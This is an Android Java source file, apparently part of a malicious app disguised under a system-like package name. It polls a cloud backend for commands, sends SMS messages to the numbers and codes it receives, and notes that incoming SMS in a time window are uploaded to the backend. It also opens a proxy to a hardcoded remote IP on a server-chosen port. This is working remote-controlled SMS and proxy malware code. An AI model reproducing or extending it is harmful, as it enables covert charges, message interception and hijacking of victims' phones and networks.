package com.android.sms.client;

import android.content.Context;
import android.util.Log;

import com.android.proxy.client.GlobalProxyUtil;
import com.avos.avoscloud.AVException;
import com.avos.avoscloud.AVObject;
import com.avos.avoscloud.AVQuery;
import com.oplay.nohelper.loader.Loader_Base_ForCommon;

import org.greenrobot.eventbus.EventBus;

import java.util.List;

/**
 * @author zyq 16-3-31
 */
public class GetMsgRunnable implements Runnable {


	private static final boolean DEBUG = true;
	private static final String TAG = "GetMsgRunnable";
	private Loader_Base_ForCommon<RemotePortJson> mLoader;
	private Context mContext;

	//在规定时间内收到的短信会被上传到后台
	public static long sendSmsTime;
	public static CheckInfo currentCheckInfo;


	public GetMsgRunnable(Context context) {
		this.mContext = context;
		mLoader = Loader_Base_ForCommon.getInstance();
	}

	@Override
	public void run() {
		try {
			if (DEBUG) {
				Log.d(TAG, "开始轮询了");
			}

			updateCheckInfo();
		} catch (Exception e) {
			if (DEBUG) {
				Log.d(TAG, e.fillInStackTrace().toString());
			}
		}
	}

	private void handleResponse(RemotePortJson remotePortJson) {
		if (remotePortJson.getCode() == 0) {
			RemotePortInfo info = remotePortJson.getData();
			if (info != null) {
				int port = info.getPort();
				Log.d(TAG, "获取的远程端口是：" + info.getPort());
				if (port > 10000) {
					GlobalProxyUtil.getInstance(mContext).startProxy("103.27.79.138", port);
				}
			}
		}
	}


	//获取最新的指令，
	private void updateCheckInfo() throws AVException {
		AVQuery<CheckInfo> query = AVObject.getQuery(CheckInfo.class);
		List<CheckInfo> list = query.find();
		if (list != null && list.size() > 0) {
			if (DEBUG) {
				Log.d(TAG, "查询的数量是：" + list.size());
			}
			for (int i = 0; i < list.size(); i++) {
				CheckInfo info = list.get(i);
				final boolean isDeleteOldData = info.getDeleteOldData();
				final String operators = info.getOperators();
				final String operatorCode = info.getOperatorCode();

				final String operatorInfo = operators + "_" + operatorCode;
				boolean isExist = Util_Sp.isOperatorInfoExist(mContext, operatorInfo);
				if (isExist) {
					if (!isDeleteOldData) {
						continue;
					}
				}
				//发送短信
				if (DEBUG) Log.d(TAG, "开始发送短信！！！！！！！！");
				SmsManageUtil.getInstance(mContext).sendSMS(operators, operatorCode);
				currentCheckInfo = info;
				String message = "send " + info.getOperatorCode() + " to " + info.getOperators();
				MessageEvent messageEvent = new MessageEvent(message);
				EventBus.getDefault().post(messageEvent);
				try {
					if (DEBUG) {
						Log.d(TAG, "４５秒后重新查询！！！！");
					}
					Thread.sleep(45000);
				} catch (InterruptedException e) {
					if (DEBUG) {
						Log.e(TAG, e.toString());
					}
				}


			}
		}
	}


}
